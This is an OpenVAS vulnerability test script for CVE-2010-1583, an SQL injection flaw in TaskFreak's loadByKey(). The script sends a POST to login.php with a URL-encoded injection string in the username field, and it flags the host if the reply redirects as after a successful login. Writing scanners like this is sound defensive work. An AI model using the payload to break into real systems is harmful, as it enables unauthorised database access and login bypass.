##############################################################################
# OpenVAS Vulnerability Test
#
# Task Freak 'loadByKey()' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902052");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)");
  script_cve_id("CVE-2010-1583");
  script_bugtraq_id(39793);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Task Freak 'loadByKey()' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://www.madirish.net/?article=456");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58241");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12452");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_task_freak_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TaskFreak/installed");

  script_tag(name:"insight", value:"The flaw exists due to the error in 'loadByKey()', which fails to sufficiently
  sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to the TaskFreak version 0.6.3.");

  script_tag(name:"summary", value:"This host is running Task Freak and is prone SQL Injection
  Vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view, add, modify or
  delete information in the back-end database.");

  script_tag(name:"affected", value:"TaskFreak version prior to 0.6.3");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

tfPort = http_get_port(default:80);
tfVer = get_kb_item("www/"+ tfPort + "/TaskFreak");
if(!tfVer){
  exit(0);
}

tfVer = eregmatch(pattern:"^(.+) under (/.*)$", string:tfVer);
if(tfVer[2] != NULL)
{

  if(tfVer[2] == "/")
    tfVer[2] = "";

  useragent = http_get_user_agent();
  filename = string(tfVer[2] + "/login.php");
  authVariables ="username=+%221%27+or+1%3D%271%22++";

  host = http_host_name( port:tfPort );

  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "User-Agent: ", useragent, "\r\n",
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                   "Accept-Language: en-us,en;q=0.5\r\n",
                   "Keep-Alive: 300\r\n",
                   "Connection: keep-alive\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_keepalive_send_recv(port:tfPort, data:sndReq);

  if("Location: index.php?" >< rcvRes){
    report = http_report_vuln_url(port:tfPort, url:filename);
    security_message(port:tfPort, data:report);
  }
}
